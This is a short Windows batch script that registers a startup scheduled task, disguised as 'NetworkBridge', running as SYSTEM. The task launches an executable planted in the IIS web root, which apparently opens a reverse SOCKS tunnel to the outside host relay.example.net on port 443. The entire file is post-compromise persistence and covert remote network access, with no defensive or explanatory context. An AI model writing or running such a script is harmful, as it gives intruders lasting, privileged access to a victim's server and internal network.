@echo off
  SCHTASKS.EXE /CREATE /tn NetworkBridge /tr "C:\inetpub\wwwroot\bridge.exe client --keepalive 10s relay.example.net:443 R:9050:socks" /sc onstart /ru SYSTEM /rl HIGHEST /f
